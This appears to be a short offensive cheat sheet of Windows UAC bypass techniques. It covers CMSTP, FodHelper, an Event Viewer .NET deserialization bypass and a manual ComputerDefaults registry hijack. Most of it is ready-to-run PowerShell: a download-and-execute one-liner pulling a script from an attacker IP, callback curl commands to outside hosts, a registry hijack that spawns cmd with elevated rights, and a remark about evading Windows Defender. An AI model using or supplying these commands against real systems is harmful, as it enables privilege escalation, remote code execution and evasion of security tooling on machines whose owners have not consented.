## CMSTP

Source: https://github.com/expl0itabl3/uac-bypass-cmstp.<br>
- Invoke: `iex(iwr http://192.168.45.195/cmstp.ps1 -useb)`
- Execute: `Bypass-UAC -Command "curl http://192.168.45.223/worked"`

## FodHelper

- uses CurVer to abuse UAC, should bypass Windows Defender (?)

## EventViewer
- RCE through Unsafe .Net Deserialization in Windows Event Viewer which leads to UAC bypass.

```powershell
    PS C:\Windows\Tasks> Import-Module .\Invoke-EventViewer.ps1
    
    PS C:\Windows\Tasks> Invoke-EventViewer 
    [-] Usage: Invoke-EventViewer commandhere
    Example: Invoke-EventViewer cmd.exe
    
    PS C:\Windows\Tasks> Invoke-EventViewer cmd.exe
    [+] Running
    [1] Crafting Payload
    [2] Writing Payload
    [+] EventViewer Folder exists
    [3] Finally, invoking eventvwr
```

## Manual Approach - ComputerDefaults
```powershell
New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "C:\Windows\System32\cmd.exe /c curl http://192.168.50.149/worked" -Force
Start-Process "C:\Windows\System32\ComputerDefaults.exe"
```
